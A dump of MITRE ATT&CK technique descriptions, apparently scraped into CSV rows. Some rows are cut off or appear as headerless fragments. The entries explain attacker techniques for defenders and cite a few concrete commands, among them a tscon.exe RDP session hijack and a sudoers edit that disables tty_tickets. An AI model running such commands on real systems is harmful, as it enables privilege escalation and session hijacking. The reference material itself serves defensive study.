T1110.004,Brute Force: Credential Stuffing,"Adversaries may use credentials obtained from breach dumps of unrelated accounts to gain access to target accounts through credential overlap. Occasionally, large numbers of username and password pairs are dumped online when a website or service is compromised and the user account credentials accessed. The information may be useful to an adversary attempting to compromise accounts by taking advantage of the tendency for users to use the same passwords across personal and business accounts.   Credential stuffing is a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies.   Typically, management services over commonly used ports are used when stuffing credentials. Commonly targeted services include the following:   In addition to management services, adversaries may ""target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,"" as well as externally facing email applications, such as Office 365.

T1563.002,Remote Service Session Hijacking: RDP Hijacking,"Adversaries may hijack a legitimate user’s remote desktop session to move laterally within an environment. Remote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS).   [1]      Adversaries may perform RDP session hijacking which involves stealing a legitimate user's remote session. Typically, a user is notified when someone else is trying to steal their session. With System permissions and using Terminal Services Console,  c:\windows\system32\tscon.exe [session number to be stolen] , an adversary can hijack a session without the need for credentials or prompts to the user.   [2]    This can be done remotely or locally and with active or disconnected sessions.   [3]    It can also lead to  Remote System Discovery  and Privilege Escalation by stealing a Domain Admin or higher privileged account session. All of this can be done by using native Windows commands, but it has also been added as a feature in red teaming tools.   [4]",Description

T1498.001,Network Denial of Service: Direct Network Flood,"Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network.  Direct Network Flood s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.   Botnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.   [1]",Description
T1622,Debugger Evasion,"Adversaries may employ various means to detect and avoid debuggers. Debuggers are typically used by defenders to trace and/or analyze the execution of potential malware payloads.   [1]      Debugger evasion may include changing behaviors based on the results of the checks for the presence of artifacts indicative of a debugged environment. Similar to  Virtualization/Sandbox Evasion , if the adversary detects a debugger, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for debugger artifacts before dropping secondary or additional payloads.   Specific checks will vary based on the target and/or adversary, but may involve  Native API  function calls such as  IsDebuggerPresent()  and   NtQueryInformationProcess() , or manually checking the  BeingDebugged  flag of the Process Environment Block (PEB). Other checks for debugging artifacts may also seek to enumerate hardware breakpoints, interrupt assembly opcodes, time checks, or measurements if exceptions are raised in the current process (assuming a present debugger would ""swallow"" or handle the potential error).   [2]      [3]      [4]      Adversaries may use the information learned from these debugger checks during automated discovery to shape follow-on behaviors. Debuggers can also be evaded by detaching the process or flooding debug logs with meaningless data via messages produced by looping  Native API  function calls such as  OutputDebugStringW() .   [5]      [6]",Description

T1055.005,Process Injection: Thread Local Storage,"Adversaries may inject malicious code into processes via thread local storage (TLS) callbacks in order to evade process-based defenses as well as possibly elevate privileges. TLS callback injection is a method of executing arbitrary code in the address space of a separate live process.    TLS callback injection involves manipulating pointers inside a portable executable (PE) to redirect a process to malicious code before reaching the code's legitimate entry point. TLS callbacks are normally used by the OS to setup and/or cleanup data used by threads. Manipulating TLS callbacks may be performed by allocating and writing to specific offsets within a process’ memory space using other  Process Injection  techniques such as  Process Hollowing .   [1]      Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via TLS callback injection may also evade detection from security products since the execution is masked under a legitimate process.",Description

T1070.009,Indicator Removal: Clear Persistence,"Adversaries may clear artifacts associated with previously established persistence on a host system to remove evidence of their activity. This may involve various actions, such as removing services, deleting executables,  Modify Registry ,  Plist File Modification , or other methods of cleanup to prevent defenders from collecting evidence of their persistent presence.   [1]      In some instances, artifacts of persistence may also be removed once an adversary’s persistence is executed in order to prevent errors with the new instance of the malware.

T1572,Protocol Tunneling,"Adversaries may tunnel network communications to and from a victim system within a separate protocol to avoid detection/network filtering and/or enable access to otherwise unreachable systems. Tunneling involves explicitly encapsulating a protocol within another. This behavior may conceal malicious traffic by blending in with existing traffic and/or provide an outer layer of encryption (similar to a VPN). Tunneling could also enable routing of network packets that would otherwise not reach their intended destination, such as SMB, RDP, or other traffic that would be filtered by network appliances or not routed over the Internet.    There are various means to encapsulate a protocol within another protocol. For example, adversaries may perform SSH tunneling (also known as SSH port forwarding), which involves forwarding arbitrary data over an encrypted SSH tunnel.   [1]        Protocol Tunneling  may also be abused by adversaries during  Dynamic Resolution . Known as DNS over HTTPS (DoH), queries to resolve C2 infrastructure may be encapsulated within encrypted HTTPS packets.   [2]       Adversaries may also leverage  Protocol Tunneling  in conjunction with  Proxy  and/or  Protocol Impersonation  to further conceal C2 communications and infrastructure.",Description

T1543.003,Create or Modify System Process: Windows Service,"Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it starts programs or applications called services that perform background system functions.   [1]    Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Windows Registry.   Adversaries may install a new service or modify an existing service to execute at startup in order to persist on a system. Service configurations can be set or modified using system utilities (such as sc.exe), by directly modifying the Registry, or by interacting directly with the Windows API.    Adversaries may also use services to install and execute malicious drivers. For example, after dropping a driver file (ex:  .sys ) to disk, the payload can be loaded and registered via  Native API  functions such as  CreateServiceW()  (or manually via functions such as  ZwLoadDriver()  and  ZwSetValueKey() ), by creating the required service Registry values (i.e.  Modify Registry ), or by using command-line utilities such as  PnPUtil.exe .

T1601.001,Modify System Image: Patch System Image,"Adversaries may modify the operating system of a network device to introduce new capabilities or weaken existing defenses.   [1]       [2]       [3]       [4]       [5]    Some network devices are built with a monolithic architecture, where the entire operating system and most of the functionality of the device is contained within a single file.  Adversaries may change this file in storage, to be loaded in a future boot, or in memory during runtime.   To change the operating system in storage, the adversary will typically use the standard procedures available to device operators. This may involve downloading a new file via typical protocols used on network devices, such as TFTP, FTP, SCP, or a console connection.  The original file may be overwritten, or a new file may be written alongside of it and the device reconfigured to boot to the compromised image.   To change the operating system in memory, the adversary typically can use one of two methods. In the first, the adversary would make use of native debug commands in the original, unaltered running operating system that allow them to directly modify the relevant memory addresses containing the running operating system.  This method typically requires administrative level access to the device.   In the second method for changing the operating system in memory, the adversary would make use of the boot loader. The boot loader is the first piece of software that loads when the device starts that, in turn, will launch the operating system.  Adversaries may use malicious code previously implanted in the boot loader, such as through the  ROMMONkit  method, to directly manipulate running operating system code in memory.  This malicious code in the bootloader provides the capability of direct memory manipulation to the adversary, allowing them to patch the live operating system during runtime.   By modifying the instructions stored in the system image file, adversaries may either weaken existing defenses or provision new capabilities that the device did not have before. Examples of existing defenses that can be impeded include encryption, via  Weaken Encryption , authentication, via  Network Device Authentication , and perimeter defenses, via  Network Boundary Bridging .  Adding new capabilities for the adversary’s purpose include  Keylogging ,  Multi-hop Proxy , and  Port Knocking .   Adversaries may also compromise existing commands in the operating system to produce false output to mislead defenders.   When this method is used in conjunction with  Downgrade System Image , one example of a compromised system command may include changing the output of the command that shows the version of the currently running operating system.  By patching the operating system, the adversary can change this command to instead display the original, higher revision number that they replaced through the system downgrade.    When the operating system is patched in storage, this can be achieved in either the resident storage (typically a form of flash memory, which is non-volatile) or via  TFTP Boot .    When the technique is performed on the running operating system in memory and not on the stored copy, this technique will not survive across reboots.  However, live memory modification of the operating system can be combined with  ROMMONkit  to achieve persistence.",Description

Traffic mirroring is a native feature for some network devices and used for network analysis and may be configured to duplicate traffic and forward to one or more destinations for analysis by a network analyzer or other monitoring device.    [1]      [2]      Adversaries may abuse traffic mirroring to mirror or redirect network traffic through other network infrastructure they control. Malicious modifications to network devices to enable traffic redirection may be possible through  ROMMONkit  or  Patch System Image .   [3]      [4]    Adversaries may use traffic duplication in conjunction with  Network Sniffing ,  Input Capture , or  Adversary-in-the-Middle  depending on the goals and objectives of the adversary.",Description
T1197,BITS Jobs,"Adversaries may abuse BITS jobs to persistently execute code and perform various background tasks. Windows Background Intelligent Transfer Service (BITS) is a low-bandwidth, asynchronous file transfer mechanism exposed through  Component Object Model  (COM).   [1]      [2]    BITS is commonly used by updaters, messengers, and other applications preferred to operate in the background (using available idle bandwidth) without interrupting other networked applications. File transfer tasks are implemented as BITS jobs, which contain a queue of one or more file operations.   The interface to create and manage BITS jobs is accessible through  PowerShell  and the  BITSAdmin  tool.   [2]      [3]      Adversaries may abuse BITS to download (e.g.  Ingress Tool Transfer ), execute, and even clean up after running malicious code (e.g.  Indicator Removal ). BITS tasks are self-contained in the BITS job database, without new files or registry modifications, and often permitted by host firewalls.   [4]      [5]      [6]    BITS enabled execution may also enable persistence by creating long-standing jobs (the default maximum lifetime is 90 days and extendable) or invoking an arbitrary program when a job completes or errors (including after system reboots).   [7]      [4]      BITS upload functionalities can also be used to perform  Exfiltration Over Alternative Protocol .   [4]",Description

T1592.001,Gather Victim Host Information: Hardware,"Adversaries may gather information about the victim's host hardware that can be used during targeting. Information about hardware infrastructure may include a variety of details such as types and versions on specific hosts, as well as the presence of additional components that might be indicative of added defensive protections (ex: card/biometric readers, dedicated encryption hardware, etc.).   Adversaries may gather this information in various ways, such as direct collection actions via  Active Scanning  (ex: hostnames, server banners, user agent strings) or  Phishing for Information . Adversaries may also compromise sites then include malicious content designed to collect host information from visitors.   [1]    Information about the hardware infrastructure may also be exposed to adversaries via online or other accessible data sets (ex: job postings, network maps, assessment reports, resumes, or purchase invoices). Gathering this information may reveal opportunities for other forms of reconnaissance (ex:  Search Open Websites/Domains  or  Search Open Technical Databases ), establishing operational resources (ex:  Develop Capabilities  or  Obtain Capabilities ), and/or initial access (ex:  Compromise Hardware Supply Chain  or  Hardware Additions ).",Description
T1098.003,Account Manipulation: Additional Cloud Roles,"An adversary may add additional roles or permissions to an adversary-controlled cloud account to maintain persistent access to a tenant. For example, adversaries may update IAM policies in cloud-based environments or add a new global administrator in Office 365 environments.   [1]      [2]      [3]      [4]    With sufficient permissions, a compromised account can gain almost unlimited access to data and settings (including the ability to reset the passwords of other admins).   [5]      [4]       This account modification may immediately follow  Create Account  or other malicious account activity. Adversaries may also modify existing  Valid Accounts  that they have compromised. This could lead to privilege escalation, particularly if the roles added allow for lateral movement to additional accounts.   For example, in Azure AD environments, an adversary with the Application Administrator role can add  Additional Cloud Credentials  to their application's service principal. In doing so the adversary would be able to gain the service principal’s roles and permissions, which may be different from those of the Application Administrator.   [6]    Similarly, in AWS environments, an adversary with appropriate permissions may be able to use the  CreatePolicyVersion  API to define a new version of an IAM policy or the  AttachUserPolicy  API to attach an IAM policy with additional or distinct permissions to a compromised user account.   [7]      Similarly, an adversary with the Azure AD Global Administrator role can toggle the ""Access management for Azure resources"" option to gain the ability to assign privileged access to Azure subscriptions and virtual machines to Azure AD users, including themselves.

Adversaries may also analyze data from local host files (ex:  C:\Windows\System32\Drivers\etc\hosts  or  /etc/hosts ) or other passive means (such as local  Arp  cache entries) in order to discover the presence of remote systems in an environment.

T1587.004,Develop Capabilities: Exploits,"Adversaries may develop exploits that can be used during targeting. An exploit takes advantage of a bug or vulnerability in order to cause unintended or unanticipated behavior to occur on computer hardware or software. Rather than finding/modifying exploits from online or purchasing them from exploit vendors, an adversary may develop their own exploits.   [1]    Adversaries may use information acquired via  Vulnerabilities  to focus exploit development efforts. As part of the exploit development process, adversaries may uncover exploitable vulnerabilities through methods such as fuzzing and patch analysis.   [2]      As with legitimate development efforts, different skill sets may be required for developing exploits. The skills needed may be located in-house, or may need to be contracted out. Use of a contractor may be considered an extension of that adversary's exploit development capabilities, provided the adversary plays a role in shaping requirements and maintains an initial degree of exclusivity to the exploit.   Adversaries may use exploits during various phases of the adversary lifecycle (i.e.  Exploit Public-Facing Application ,  Exploitation for Client Execution ,  Exploitation for Privilege Escalation ,  Exploitation for Defense Evasion ,  Exploitation for Credential Access ,  Exploitation of Remote Services , and  Application or System Exploitation ).",Description
T1558,Steal or Forge Kerberos Tickets,"Adversaries may attempt to subvert Kerberos authentication by stealing or forging Kerberos tickets to enable  Pass the Ticket . Kerberos is an authentication protocol widely used in modern Windows domain environments. In Kerberos environments, referred to as ""realms"", there are three basic participants: client, service, and Key Distribution Center (KDC).   [1]    Clients request access to a service and through the exchange of Kerberos tickets, originating from KDC, they are granted access after having successfully authenticated. The KDC is responsible for both authentication and ticket granting.  Adversaries may attempt to abuse Kerberos by stealing tickets or forging tickets to enable unauthorized access.   On Windows, the built-in  klist  utility can be used to list and analyze cached Kerberos tickets.   [2]      Linux systems on Active Directory domains store Kerberos credentials locally in the credential cache file referred to as the ""ccache"". The credentials are stored in the ccache file while they remain valid and generally while a user's session lasts.   [3]    On modern Redhat Enterprise Linux systems, and derivative distributions, the System Security Services Daemon (SSSD) handles Kerberos tickets. By default SSSD maintains a copy of the ticket database that can be found in  /var/lib/sss/secrets/secrets.ldb  as well as the corresponding key located in  /var/lib/sss/secrets/.secrets.mkey . Both files require root access to read. If an adversary is able to access the database and key, the credential cache Kerberos blob can be extracted and converted into a usable Kerberos ccache file that adversaries may use for  Pass the Ticket . The ccache file may also be converted into a Windows format using tools such as Kekeo.   [4]      [5]      [6]      Kerberos tickets on macOS are stored in a standard ccache format, similar to Linux. By default, access to these ccache entries is federated through the KCM daemon process via the Mach RPC protocol, which uses the caller's environment to determine access. The storage location for these ccache entries is influenced by the  /etc/krb5.conf  configuration file and the  KRB5CCNAME  environment variable which can specify to save them to disk or keep them protected via the KCM daemon. Users can interact with ticket storage using  kinit ,  klist ,  ktutil , and  kcc  built-in binaries or via Apple's native Kerberos framework. Adversaries can use open source tools to interact with the ccache files directly or to use the Kerberos framework to call lower-level APIs for extracting the user's TGT or Service Tickets.   [7]      [8]",Description
T1612,Build Image on Host,"Adversaries may build a container image directly on a host to bypass defenses that monitor for the retrieval of malicious images from a public registry. A remote  build  request may be sent to the Docker API that includes a Dockerfile that pulls a vanilla base image, such as alpine, from a public or local registry and then builds a custom image upon it.   [1]      An adversary may take advantage of that  build  API to build a custom image on the host that includes malware downloaded from their C2 server, and then they then may utilize  Deploy Container  using that custom image.   [2]      [3]    If the base image is pulled from a public registry, defenses will likely not detect the image as malicious since it’s a vanilla image. If the base image already resides in a local registry, the pull may be considered even less suspicious since the image is already in the environment.",Description
T1134.005,Access Token Manipulation: SID-History Injection,"Adversaries may use SID-History Injection to escalate privileges and bypass access controls. The Windows security identifier (SID) is a unique value that identifies a user or group account. SIDs are used by Windows security in both security descriptors and access tokens.    [1]    An account can hold additional SIDs in the SID-History Active Directory attribute    [2]   , allowing inter-operable account migration between domains (e.g., all values in SID-History are included in access tokens).   With Domain Administrator (or equivalent) rights, harvested or well-known SID values    [3]    may be inserted into SID-History to enable impersonation of arbitrary users/groups such as Enterprise Administrators. This manipulation may result in elevated access to local resources and/or access to otherwise inaccessible domains via lateral movement techniques such as  Remote Services ,  SMB/Windows Admin Shares , or  Windows Remote Management .",Description

Mimikatz  also utilizes  SID-History Injection  to expand the scope of other components such as generated Kerberos Golden Tickets and DCSync beyond a single domain.   [5]      [6],Procedure Examples
T1619,Cloud Storage Object Discovery,"Adversaries may enumerate objects in cloud storage infrastructure. Adversaries may use this information during automated discovery to shape follow-on behaviors, including requesting all or specific objects from cloud storage.  Similar to  File and Directory Discovery  on a local host, after identifying available storage services (i.e.  Cloud Infrastructure Discovery ) adversaries may access the contents/objects stored in cloud infrastructure.   Cloud service providers offer APIs allowing users to enumerate objects stored within cloud storage. Examples include ListObjectsV2 in AWS    [1]    and List Blobs in Azure   [2]    .",Description

T1137.004,Office Application Startup: Outlook Home Page,"Adversaries may abuse Microsoft Outlook's Home Page feature to obtain persistence on a compromised system. Outlook Home Page is a legacy feature used to customize the presentation of Outlook folders. This feature allows for an internal or external URL to be loaded and presented whenever a folder is opened. A malicious HTML page can be crafted that will execute code when loaded by Outlook Home Page.   [1]      Once malicious home pages have been added to the user’s mailbox, they will be loaded when Outlook is started. Malicious Home Pages will execute when the right Outlook folder is loaded/reloaded.   [1]",Description

T1137.004,Office Application Startup: Outlook Home Page,Ruler  can be used to automate the abuse of Outlook Home Pages to establish persistence.   [3],Procedure Examples
T1528,Steal Application Access Token,"Adversaries can steal application access tokens as a means of acquiring credentials to access remote systems and resources.   Application access tokens are used to make authorized API requests on behalf of a user or service and are commonly used as a way to access resources in cloud and container-based applications and software-as-a-service (SaaS).   [1]    OAuth is one commonly implemented framework that issues tokens to users for access to systems. Adversaries who steal account API tokens in cloud and containerized environments may be able to access data and perform actions with the permissions of these accounts, which can lead to privilege escalation and further compromise of the environment.   In Kubernetes environments, processes running inside a container communicate with the Kubernetes API server using service account tokens. If a container is compromised, an attacker may be able to steal the container’s token and thereby gain access to Kubernetes API commands.   [2]      Token theft can also occur through social engineering, in which case user action may be required to grant access. An application desiring access to cloud-based services or protected APIs can gain entry using OAuth 2.0 through a variety of authorization protocols. An example commonly-used sequence is Microsoft's Authorization Code Grant flow.   [3]      [4]    An OAuth access token enables a third-party application to interact with resources containing user data in the ways requested by the application without obtaining user credentials.    Adversaries can leverage OAuth authorization by constructing a malicious application designed to be granted access to resources with the target user's OAuth token.   [5]      [6]    The adversary will need to complete registration of their application with the authorization server, for example Microsoft Identity Platform using Azure Portal, the Visual Studio IDE, the command-line interface, PowerShell, or REST API calls.   [7]    Then, they can send a  Spearphishing Link  to the target user to entice them to grant access to the application. Once the OAuth access token is granted, the application can gain potentially long-term access to features of the user account through  Application Access Token .   [8]      Application access tokens may function within a limited lifetime, limiting how long an adversary can utilize the stolen token. However, in some cases, adversaries can also steal application refresh tokens   [9]   , allowing them to obtain new access tokens without prompting the user.",Description
T1528,Steal Application Access Token,AADInternals  can steal users’ access tokens via phishing emails containing malicious links.   [10],Procedure Examples
T1528,Steal Application Access Token,"APT28  has used several malicious applications to steal user OAuth access tokens including applications masquerading as ""Google Defender"" ""Google Email Protection,"" and ""Google Scanner"" for Gmail users.

T1595,Active Scanning,"Adversaries may execute active reconnaissance scans to gather information that can be used during targeting. Active scans are those where the adversary probes victim infrastructure via network traffic, as opposed to other forms of reconnaissance that do not involve direct interaction.   Adversaries may perform different forms of active scanning depending on what information they seek to gather. These scans can also be performed in various ways, including using native features of network protocols such as ICMP.   [1]      [2]    Information from these scans may reveal opportunities for other forms of reconnaissance (ex:  Search Open Websites/Domains  or  Search Open Technical Databases ), establishing operational resources (ex:  Develop Capabilities  or  Obtain Capabilities ), and/or initial access (ex:  External Remote Services  or  Exploit Public-Facing Application ).",Description
T1484.001,Domain Policy Modification: Group Policy Modification,"Adversaries may modify Group Policy Objects (GPOs) to subvert the intended discretionary access controls for a domain, usually with the intention of escalating privileges on the domain. Group policy allows for centralized management of user and computer settings in Active Directory (AD). GPOs are containers for group policy settings made up of files stored within a predicable network path  \&lt;DOMAIN&gt;\SYSVOL\&lt;DOMAIN&gt;\Policies\ .   [1]      [2]       Like other objects in AD, GPOs have access controls associated with them. By default all user accounts in the domain have permission to read GPOs. It is possible to delegate GPO access control permissions, e.g. write access, to specific users or groups in the domain.   Malicious GPO modifications can be used to implement many other malicious behaviors such as  Scheduled Task/Job ,  Disable or Modify Tools ,  Ingress Tool Transfer ,  Create Account ,  Service Execution ,  and more.   [2]      [3]      [4]      [5]      [6]    Since GPOs can control so many user and machine settings in the AD environment, there are a great number of potential attacks that can stem from this GPO abuse.   [3]      For example, publicly available scripts such as  New-GPOImmediateTask  can be leveraged to automate the creation of a malicious  Scheduled Task/Job  by modifying GPO settings, in this case modifying  &lt;GPO_PATH&gt;\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml .   [3]      [4]    In some cases an adversary might modify specific user rights like SeEnableDelegationPrivilege, set in  &lt;GPO_PATH&gt;\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf , to achieve a subtle AD backdoor with complete control of the domain because the user account under the adversary's control would then be able to modify GPOs.

T1606.001,Forge Web Credentials: Web Cookies,"Adversaries may forge web cookies that can be used to gain access to web applications or Internet services. Web applications and services (hosted in cloud SaaS environments or on-premise servers) often use session cookies to authenticate and authorize user access.   Adversaries may generate these cookies in order to gain access to web resources. This differs from  Steal Web Session Cookie  and other similar behaviors in that the cookies are new and forged by the adversary, rather than stolen or intercepted from legitimate users. Most common web applications have standardized and documented cookie values that can be generated using provided tools or interfaces.   [1]    The generation of web cookies often requires secret values, such as passwords,  Private Keys , or other cryptographic seed values.   Once forged, adversaries may use these web cookies to access resources ( Web Session Cookie ), which may bypass multi-factor and other authentication protection mechanisms.

T1210,Exploitation of Remote Services,"Adversaries may exploit remote services to gain unauthorized access to internal systems once inside of a network. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system.   An adversary may need to determine if the remote system is in a vulnerable state, which may be done through  Network Service Discovery  or other Discovery methods looking for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities,  or security software that may be used to detect or contain remote exploitation. Servers are likely a high value target for lateral movement exploitation, but endpoint systems may also be at risk if they provide an advantage or access to additional resources.   There are several well-known vulnerabilities that exist in common services such as SMB    [1]    and RDP    [2]    as well as applications that may be used within internal networks such as MySQL    [3]    and web server services.   [4]      Depending on the permissions level of the vulnerable remote service an adversary may achieve  Exploitation for Privilege Escalation  as a result of lateral movement exploitation as well.",Description

T1574.008,Hijack Execution Flow: Path Interception by Search Order Hijacking,"Adversaries may execute their own malicious payloads by hijacking the search order used to load other programs. Because some programs do not call other programs using the full path, adversaries may place their own file in the directory where the calling program is located, causing the operating system to launch their malicious software at the request of the calling program.   Search order hijacking occurs when an adversary abuses the order in which Windows searches for programs that are not given a path. Unlike  DLL Search Order Hijacking , the search order differs depending on the method that is used to execute the program.    [1]       [2]       [3]    However, it is common for Windows to search in the directory of the initiating program before searching through the Windows system directory. An adversary who finds a program vulnerable to search order hijacking (i.e., a program that does not specify the path to an executable) may take advantage of this vulnerability by creating a program named after the improperly specified program and placing it within the initiating program's directory.   For example, ""example.exe"" runs ""cmd.exe"" with the command-line argument  net user . An adversary may place a program called ""net.exe"" within the same directory as example.exe, ""net.exe"" will be run instead of the Windows system utility net. In addition, if an adversary places a program called ""net.com"" in the same directory as ""net.exe"", then  cmd.exe /C net user  will execute ""net.com"" instead of ""net.exe"" due to the order of executable extensions defined under PATHEXT.    [4]      Search order hijacking is also a common practice for hijacking DLL loads and is covered in  DLL Search Order Hijacking .",Description

T1558.003,Steal or Forge Kerberos Tickets: Kerberoasting,"Adversaries may abuse a valid Kerberos ticket-granting ticket (TGT) or sniff network traffic to obtain a ticket-granting service (TGS) ticket that may be vulnerable to  Brute Force .   [1]      [2]       Service principal names (SPNs) are used to uniquely identify each instance of a Windows service.

[1]      [2]    By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making.   Stored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",Description

T1553.003,Subvert Trust Controls: SIP and Trust Provider Hijacking,"Adversaries may tamper with SIP and trust provider components to mislead the operating system and application control tools when conducting signature validation checks. In user mode, Windows Authenticode    [1]    digital signatures are used to verify a file's origin and integrity, variables that may be used to establish trust in signed code (ex: a driver with a valid Microsoft signature may be handled as safe). The signature validation process is handled via the WinVerifyTrust application programming interface (API) function,     [2]    which accepts an inquiry and coordinates with the appropriate trust provider, which is responsible for validating parameters of a signature.    [3]      Because of the varying executable file types and corresponding signature formats, Microsoft created software components called Subject Interface Packages (SIPs)    [4]    to provide a layer of abstraction between API functions and files. SIPs are responsible for enabling API functions to create, retrieve, calculate, and verify signatures. Unique SIPs exist for most file formats (Executable, PowerShell, Installer, etc., with catalog signing providing a catch-all     [5]   ) and are identified by globally unique identifiers (GUIDs).    [3]      Similar to  Code Signing , adversaries may abuse this architecture to subvert trust controls and bypass security policies that allow only legitimately signed code to execute on a system. Adversaries may hijack SIP and trust provider components to mislead operating system and application control tools to classify malicious (or any) code as signed by:    [3]      Hijacking SIP or trust provider components can also enable persistent code execution, since these malicious components may be invoked by any application that performs code signing or signature validation.    [3]",Description
T1600.002,Weaken Encryption: Disable Crypto Hardware,"Adversaries disable a network device’s dedicated hardware encryption, which may enable them to leverage weaknesses in software encryption in order to reduce the effort involved in collecting, manipulating, and exfiltrating transmitted data.   Many network devices such as routers, switches, and firewalls, perform encryption on network traffic to secure transmission across networks. Often, these devices are equipped with special, dedicated encryption hardware to greatly increase the speed of the encryption process as well as to prevent malicious tampering. When an adversary takes control of such a device, they may disable the dedicated hardware, for example, through use of  Modify System Image , forcing the use of software to perform encryption on general processors. This is typically used in conjunction with attacks to weaken the strength of the cipher in software (e.g.,  Reduce Key Space ).    [1]",Description
T1548.003,Abuse Elevation Control Mechanism: Sudo and Sudo Caching,"Adversaries may perform sudo caching and/or use the sudoers file to elevate privileges. Adversaries may do this to execute commands as other users or spawn processes with higher privileges.   Within Linux and MacOS systems, sudo (sometimes referred to as ""superuser do"") allows users to perform commands from terminals with elevated privileges and to control who can perform these commands on the system. The  sudo  command ""allows a system administrator to delegate authority to give certain users (or groups of users) the ability to run some (or all) commands as root or another user while providing an audit trail of the commands and their arguments.""   [1]    Since sudo was made for the system administrator, it has some useful configuration features such as a  timestamp_timeout , which is the amount of time in minutes between instances of  sudo  before it will re-prompt for a password. This is because  sudo  has the ability to cache credentials for a period of time. Sudo creates (or touches) a file at  /var/db/sudo  with a timestamp of when sudo was last run to determine this timeout. Additionally, there is a  tty_tickets  variable that treats each new tty (terminal session) in isolation. This means that, for example, the sudo timeout of one tty will not affect another tty (you will have to type the password again).   The sudoers file,  /etc/sudoers , describes which users can run which commands and from which terminals. This also describes which commands users can run as other users or groups. This provides the principle of least privilege such that users are running in their lowest possible permissions for most of the time and only elevate to other users or permissions as needed, typically by prompting for a password. However, the sudoers file can also specify when to not prompt users for passwords with a line like  user1 ALL=(ALL) NOPASSWD: ALL .   [2]    Elevated privileges are required to edit this file though.   Adversaries can also abuse poor configurations of these mechanisms to escalate privileges without needing the user's password. For example,  /var/db/sudo 's timestamp can be monitored to see if it falls within the  timestamp_timeout  range. If it does, then malware can execute sudo commands without needing to supply the user's password. Additional, if  tty_tickets  is disabled, adversaries can do this from any tty for that user.   In the wild, malware has disabled  tty_tickets  to potentially make scripting easier by issuing  echo \'Defaults !tty_tickets\' &gt;&gt; /etc/sudoers .   [3]    In order for this change to be reflected, the malware also issued  killall Terminal . As of macOS Sierra, the sudoers file has  tty_tickets  enabled by default.",Description

T1595.003,Active Scanning: Wordlist Scanning,"Adversaries may iteratively probe infrastructure using brute-forcing and crawling techniques. While this technique employs similar methods to  Brute Force , its goal is the identification of content and infrastructure rather than the discovery of valid credentials. Wordlists used in these scans may contain generic, commonly used names and file extensions or terms specific to a particular software. Adversaries may also create custom, target-specific wordlists using data gathered from other Reconnaissance techniques (ex:  Gather Victim Org Information , or  Search Victim-Owned Websites ).   For example, adversaries may use web content discovery tools such as Dirb, DirBuster, and GoBuster and generic or custom wordlists to enumerate a website’s pages and directories.   [1]    This can help them to discover old, vulnerable pages or hidden administrative portals that could become the target of further operations (ex:  Exploit Public-Facing Application  or  Brute Force ).     As cloud storage solutions typically use globally unique names, adversaries may also use target-specific wordlists and tools such as s3recon and GCPBucketBrute to enumerate public and private buckets on cloud infrastructure.   [2]      [3]    Once storage objects are discovered, adversaries may leverage  Data from Cloud Storage  to access valuable information that can be exfiltrated or used to escalate privileges and move laterally.",Description

Data may be kept in separate files or combined into one file through techniques such as  Archive Collected Data . Interactive command shells may be used, and common functionality within  cmd  and bash may be used to copy data into a staging location.   In cloud environments, adversaries may stage data within a particular instance or virtual machine before exfiltration. An adversary may  Create Cloud Instance  and stage data in that instance.   [1]      By staging data on one system prior to Exfiltration, adversaries can minimize the number of connections made to their C2 server and better evade detection.",Description

These actions could also include account activity designed to subvert security policies, such as performing iterative password updates to bypass password duration policies and preserve the life of compromised credentials.    In order to create or manipulate accounts, the adversary must already have sufficient permissions on systems or the domain.

T1557.003,Adversary-in-the-Middle: DHCP Spoofing,"Adversaries may redirect network traffic to adversary-owned systems by spoofing Dynamic Host Configuration Protocol (DHCP) traffic and acting as a malicious DHCP server on the victim network. By achieving the adversary-in-the-middle (AiTM) position, adversaries may collect network communications, including passed credentials, especially those sent over insecure, unencrypted protocols. This may also enable follow-on behaviors such as  Network Sniffing  or  Transmitted Data Manipulation .   DHCP is based on a client-server model and has two functionalities: a protocol for providing network configuration settings from a DHCP server to a client and a mechanism for allocating network addresses to clients.   [1]    The typical server-client interaction is as follows:    Adversaries may spoof as a rogue DHCP server on the victim network, from which legitimate hosts may receive malicious network configurations. For example, malware can act as a DHCP server and provide adversary-owned DNS servers to the victimized computers.   [2]      [3]    Through the malicious network configurations, an adversary may achieve the AiTM position, route client traffic through adversary-controlled systems, and collect information from the client network.   DHCPv6 clients can receive network configuration information without being assigned an IP address by sending a  INFORMATION-REQUEST (code 11)  message to the  All_DHCP_Relay_Agents_and_Servers  multicast address.   [4]    Adversaries may use their rogue DHCP server to respond to this request message with malicious network configurations.   Rather than establishing an AiTM position, adversaries may also abuse DHCP spoofing to perform a DHCP exhaustion attack (i.e,  Service Exhaustion Flood 